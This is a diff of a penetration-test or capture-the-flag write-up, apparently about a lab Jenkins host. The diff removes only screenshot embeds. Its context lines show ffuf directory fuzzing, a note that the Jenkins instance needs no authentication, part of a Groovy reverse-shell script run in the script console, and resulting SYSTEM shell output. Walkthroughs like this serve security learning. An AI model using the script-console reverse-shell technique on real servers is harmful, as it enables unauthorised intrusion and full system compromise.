@@ -66,10 +66,6 @@ The web application on port 80 presented a search interface. Testing revealed th
 **3. Jenkins Discovery and Enumeration**  
 Further enumeration of the service on port 50000 revealed a Jenkins continuous integration server. Directory fuzzing identified the `/askjeeves` endpoint, which redirected to the Jenkins dashboard. Notably, the Jenkins instance was accessible without any authentication requirements.
 
-![[port-80-of-the-host.png]]
-
-``Putting 'TEST'
-![[after-putting-test.png]]
 
 ```bash
  ffuf -u http://10.129.228.112:50000/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
@@ -122,8 +118,6 @@ Content-Length: 12077
 Server: Jetty(9.4.z-SNAPSHOT)
 ```
 
-![[test-payload-groovyscript.png]]
-
 
 **5. Reverse Shell Payload Execution**  
 The following Groovy script was executed in the Jenkins script console to establish a reverse shell connection:
@@ -134,8 +128,6 @@ def proc = cmd.execute()
 proc.consumeProcessOutput(sout, serr)
 println "out> $sout err> $serr"
 ```
-
-![[Reverse-shell.png]]
 
 ### Phase 4: Post-Exploitation and Lateral Movement
 
@@ -269,8 +261,6 @@ Microsoft Windows [Version 10.0.10586]
 
 C:\Windows\system32> whoami
 nt authority\system
-
-
 ```
 
 
